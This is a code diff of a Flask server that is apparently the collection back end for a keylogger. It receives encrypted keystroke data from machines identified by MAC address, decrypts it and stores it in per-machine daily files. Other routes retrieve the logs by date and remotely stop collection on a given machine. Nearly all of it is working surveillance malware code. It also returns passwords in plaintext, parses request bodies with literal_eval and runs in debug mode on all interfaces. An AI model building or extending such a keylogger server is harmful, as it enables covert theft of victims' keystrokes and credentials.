@@ -46,7 +46,6 @@ def login():
         if users[username] == password:
             failed_attempts[username] = 0  # איפוס נסיונות
             return jsonify({"name": username, "password": password})
-            # return render_template("index_david.html")    #'''כאן צריך לשלוח אותו לדף HTML'''
         else:
             # עדכון נסיונות שגויים
             failed_attempts[username] = failed_attempts.get(username, 0) + 1
@@ -89,26 +88,29 @@ def get_by_date():
     key = Decrypt.get_key(mac)
     path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}'
     try:
-        with open(path, 'r') as f:
+        with open(path, 'r', encoding='utf-8', errors='replace') as f:
             file_data = f.read()
-            byte_value = ast.literal_eval(file_data)
-            decrypted_data = Decrypt.decrypt_data(byte_value, key)
-            return str(decrypted_data), 200
-    except Exception:
+            # decrypted_data = Decrypt.decrypt_data(file_data, key)
+            # print(decrypted_data,22222222222)
+            return file_data
+    except Exception as e:
+        print(e)
         return jsonify({'status':'date not available'}), 400
 
 
 @app.route('/add_data', methods=['POST'])
 def add_data():
-    dict_data = dict(request.json)
-    data = dict_data['data'].encode()
+    dict_data = dict(ast.literal_eval(request.data.decode().replace("'", "\"")))
+    data = dict_data['data']
     mac = dict_data['mac']
+    key=Decrypt.get_key(mac)
+    decrypted_data = Decrypt.decrypt_data(data,key)
     try:
         os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
     except FileExistsError:
         try:
-            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'ab') as f:
-                f.write(data)
+            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'a') as f:
+                f.write(decrypted_data)
                 return jsonify({'post':'successful'}), 200
         except Exception as e:
             print(e)
@@ -148,6 +150,21 @@ def check_status():
         pass
     return jsonify({'exit': False}), 200
 
+
+@app.route('/stop', methods=['GET'])
+def stop():
+    try:
+        mac = request.args.get('mac')
+        print(mac)
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
+            dic_status = json.loads(f.read())
+            dic_status[mac] = False
+            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
+                json.dump(dic_status, file)
+                print('success')
+                return jsonify({'status':'success'}) , 200
+    except:
+        return jsonify({'status':'mac not available'}) , 400
 
 
 app.run(debug=True, host='0.0.0.0')
